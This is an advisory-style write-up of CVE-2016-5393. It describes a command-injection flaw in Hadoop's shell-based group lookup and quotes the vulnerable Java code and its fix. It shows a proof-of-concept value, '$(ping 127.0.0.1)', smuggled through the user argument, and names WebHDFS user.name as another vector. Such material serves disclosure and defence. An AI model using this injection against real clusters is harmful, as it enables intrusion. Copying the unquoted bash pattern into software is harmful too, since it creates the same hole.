CVE-2016-5393 - Authenticated command execution as the hdfs user
================================================================

Description
-----------
Hadoop 2.6.x < 2.6.5 and 2.7.x < 2.7.3 is vulnerable to an **authenticated command execution as the hdfs user on clusters having `org.apache.hadoop.security.ShellBasedUnixGroupsMapping` as the `hadoop.security.group.mapping` property** (defined in `core-site.xml`).  

This property is **not the default value**, which is [`org.apache.hadoop.security.JniBasedUnixGroupsMappingWithFallback`](https://hadoop.apache.org/docs/r2.6.0/hadoop-project-dist/hadoop-hdfs/HdfsPermissionsGuide.html#Group_Mapping), and which is **not vulnerable**.  

The vulnerability relies in the fact that the group lookup function of a username does not escape the provided **`user` parameter** and pass it to a **`"bash -c"` command**.   

The vulnerable code is located in the `hadoop-common-project/hadoop-common/src/main/java/org/apache/hadoop/util/Shell.java` file of [that revision](https://github.com/apache/hadoop/blob/9d4d30243b0fc9630da51a2c17b543ef671d035c/hadoop-common-project/hadoop-common/src/main/java/org/apache/hadoop/util/Shell.java) in the `getGroupsForUserCommand` function:
```
public static String[] getGroupsForUserCommand(final String user) {
//'groups username' command return is inconsistent across different unixes
return WINDOWS ?
  new String[]
      {getWinUtilsPath(), "groups", "-F", "\"" + user + "\""}
  : new String[] {"bash", "-c", "id -gn " + user + "; id -Gn " + user};
}
```  
This vulnerability has been fixed on August 2nd 2016 in the [following commit](https://github.com/apache/hadoop/commit/954465e7ba3af3e5b083b6251562e5e77529f906) by adding the `bashQuote` function:
```
static String bashQuote(String arg) {
  StringBuilder buffer = new StringBuilder(arg.length() + 2);
  buffer.append('\'');
  buffer.append(arg.replace("'", "'\\''"));
  buffer.append('\'');
  return buffer.toString();
}

public static String[] getGroupsForUserCommand(final String user) {
  //'groups username' command return is inconsistent across different unixes
  if (WINDOWS) {
    return new String[]
        {getWinUtilsPath(), "groups", "-F", "\"" + user + "\""};
  } else {
    String quotedUser = bashQuote(user);
    return new String[] {"bash", "-c", "id -gn " + quotedUser +
                          "; id -Gn " + quotedUser};
  }
}
```
  
Exploitation
------------
* With the Hadoop client command `hdfs groups`:
  ```
  $ hdfs groups '$(ping 127.0.0.1)'
  
  $ ps aux|grep --color "ping 12"
  ...
  hdfs      6227  0.0  0.0  15484   764 ?        S    13:24   0:00 bash -c id -gn $(ping 127.0.0.1)&& id -Gn $(ping 127.0.0.1)
  hdfs      6228  0.0  0.0  14732   868 ?        S    13:24   0:00 ping 127.0.0.1
  ...
  ```
* Through the `user.name` parameter on WebHDFS, but in that case:
  * `Simple` authentication should be deployed in order to have `user.name` manipulable  
  * So this does not provide more read access to data, as `Simple` authentication does not protect from user spoofing, but it adds command execution capability on the NameNode  
  
  
Post-exploitation
-----------------
Being the `hdfs` user, an attacker could then **access the entire distributed filesystem* as well as gaining a **unprivileged shell access** to the NameNode.  
  
  
References
----------
* https://www.cvedetails.com/cve/CVE-2016-5393/
* http://seclists.org/oss-sec/2016/q4/537